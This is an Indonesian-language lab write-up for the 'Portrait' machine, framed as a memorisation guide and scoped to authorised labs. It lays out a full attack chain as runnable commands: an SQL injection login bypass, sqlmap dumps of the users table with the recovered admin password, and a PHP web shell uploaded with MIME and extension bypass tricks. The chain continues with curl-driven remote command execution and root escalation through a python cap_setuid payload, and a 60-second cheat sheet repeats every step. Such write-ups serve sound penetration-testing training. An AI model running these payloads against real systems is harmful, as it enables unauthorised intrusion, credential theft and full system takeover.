# Write-Up Lab Portrait — Versi Closed Book

> **Ruang lingkup:** hanya untuk laboratorium atau sistem yang telah memberikan izin pengujian.

## 1. Gambaran Singkat

| Komponen | Nilai |
|---|---|
| Target | `192.168.56.118:8080` |
| Aplikasi | Portrait Studio |
| Celah awal | SQL Injection pada login |
| Foothold | Upload web shell sebagai `www-data` |
| Privilege escalation | Python memiliki `cap_setuid=ep` |
| Akses akhir | `root` |

Rantai serangan:

```text
Recon
→ SQL Injection
→ credential admin
→ upload PHP
→ RCE sebagai www-data
→ getcap
→ Python cap_setuid
→ root
```

## 2. Mnemonic: R-S-U-C-R

```text
R = Recon
S = SQL Injection
U = Upload web shell
C = Capability
R = Root
```

---

# Fase 1 — Recon

## 3. Scan Service dan Direktori

```bash
nmap -Pn -sC -sV -p8080 192.168.56.118

dirsearch \
  -u http://192.168.56.118:8080 \
  -e php
```

Temuan yang perlu diingat:

```text
/administrator  → login admin
/profile        → upload avatar
/uploads        → lokasi file upload
```

---

# Fase 2 — SQL Injection

## 4. Uji Login Bypass

Payload:

```sql
' OR '1'='1
```

Gunakan pada field login untuk memeriksa apakah autentikasi dapat dilewati.

Alasan payload bekerja:

```text
'1'='1' selalu bernilai TRUE
```

## 5. Dump Credential dengan SQLMap

Gunakan pola yang sama: URL, data POST, parameter rentan, lalu opsi enumerasi.

Cari database:

```bash
sqlmap \
  -u 'http://192.168.56.118:8080/administrator' \
  --data='username=admin&password=test' \
  -p username \
  --batch \
  --current-db
```

Hasil:

```text
portrait
```

Cari tabel:

```bash
sqlmap \
  -u 'http://192.168.56.118:8080/administrator' \
  --data='username=admin&password=test' \
  -p username \
  --batch \
  -D portrait \
  --tables
```

Hasil penting:

```text
users
```

Dump tabel:

```bash
sqlmap \
  -u 'http://192.168.56.118:8080/administrator' \
  --data='username=admin&password=test' \
  -p username \
  --batch \
  -D portrait \
  -T users \
  --dump
```

Credential lab:

```text
Username : admin
Password : AdminPortr417126
```

Mnemonic SQLMap:

```text
D-T-D
Database → Tables → Dump
```

---

# Fase 3 — Upload Web Shell

## 6. Login dan Buka Profil

Login:

```text
URL      : http://192.168.56.118:8080/administrator
Username : admin
Password : AdminPortr417126
```

Buka:

```text
http://192.168.56.118:8080/profile
```

## 7. Membuat Web Shell

```bash
cat > cakgup.php <<'EOF'
<?php system($_GET['cmd']); ?>
EOF
```

Upload melalui fitur avatar.

Apabila aplikasi memeriksa MIME type, ubah MIME menjadi:

```text
image/jpeg
```

Apabila ekstensi `.php` ditolak, uji nama:

```text
cakgup.php.jpg
```

> Jalur utama lab adalah memastikan file tetap diproses sebagai PHP setelah upload. Gunakan Burp Suite untuk mengubah nama file atau `Content-Type` bila diperlukan.

## 8. Memvalidasi RCE

Coba lokasi berikut sesuai nama file yang berhasil diunggah:

```text
http://192.168.56.118:8080/uploads/cakgup.php?cmd=id
```

Versi curl:

```bash
SHELL_URL="http://192.168.56.118:8080/uploads/cakgup.php"

curl -sG \
  --data-urlencode "cmd=id" \
  "$SHELL_URL"
```

Indikator:

```text
uid=33(www-data) gid=33(www-data)
```

Foothold berhasil sebagai `www-data`.

---

# Fase 4 — Menemukan Capability Berbahaya

## 9. Enumerasi Singkat

```bash
curl -sG \
  --data-urlencode \
  "cmd=id; uname -a; cat /etc/os-release" \
  "$SHELL_URL"
```

Jangan langsung memakai kernel exploit. Periksa misconfiguration sederhana terlebih dahulu:

```bash
curl -sG \
  --data-urlencode \
  "cmd=getcap -r / 2>/dev/null" \
  "$SHELL_URL"
```

Temuan kritis:

```text
/usr/bin/python3.13 cap_setuid=ep
```

Arti temuan:

```text
Python diizinkan mengubah UID proses.
Python dapat menjalankan os.setuid(0).
UID 0 adalah root.
```

Rumus hafalan:

```text
Python + cap_setuid + os.setuid(0) = root
```

---

# Fase 5 — Root

## 10. Bukti Root Melalui Web Shell

```bash
curl -sG \
  --data-urlencode \
  "cmd=/usr/bin/python3.13 -c 'import os; os.setuid(0); os.system(\"id; whoami\")'" \
  "$SHELL_URL"
```

Indikator:

```text
uid=0(root)
root
```

Payload inti yang wajib diingat:

```bash
/usr/bin/python3.13 -c 'import os; os.setuid(0); os.execl("/bin/sh", "sh")'
```

Pada web shell non-interaktif, gunakan `os.system("id; whoami")` sebagai bukti. Pada shell interaktif, gunakan `os.execl()` untuk membuka shell.

---

# 11. Cleanup

Hapus web shell melalui fitur profil/upload aplikasi. Apabila penghapusan harus dilakukan dari server, pastikan document root telah diverifikasi terlebih dahulu dan hapus hanya file yang dibuat selama pengujian.

---

# 12. Cheat Sheet 60 Detik

```bash
# 1. Recon
nmap -Pn -sC -sV -p8080 192.168.56.118
dirsearch -u http://192.168.56.118:8080 -e php

# 2. SQLMap: D-T-D
sqlmap -u http://192.168.56.118:8080/administrator \
--data='username=admin&password=test' -p username --batch --current-db

sqlmap -u http://192.168.56.118:8080/administrator \
--data='username=admin&password=test' -p username --batch \
-D portrait --tables

sqlmap -u http://192.168.56.118:8080/administrator \
--data='username=admin&password=test' -p username --batch \
-D portrait -T users --dump

# 3. Upload PHP
echo '<?php system($_GET["cmd"]); ?>' > cakgup.php

# 4. RCE
SHELL_URL="http://192.168.56.118:8080/uploads/cakgup.php"
curl -sG --data-urlencode "cmd=id" "$SHELL_URL"

# 5. Capability
curl -sG --data-urlencode "cmd=getcap -r / 2>/dev/null" "$SHELL_URL"

# 6. Root
curl -sG --data-urlencode \
"cmd=/usr/bin/python3.13 -c 'import os; os.setuid(0); os.system(\"id; whoami\")'" \
"$SHELL_URL"
```

## Kalimat Hafalan

```text
Cari admin, SQLi login, dump user, upload PHP,
cek getcap, Python setuid nol, lalu root.
```
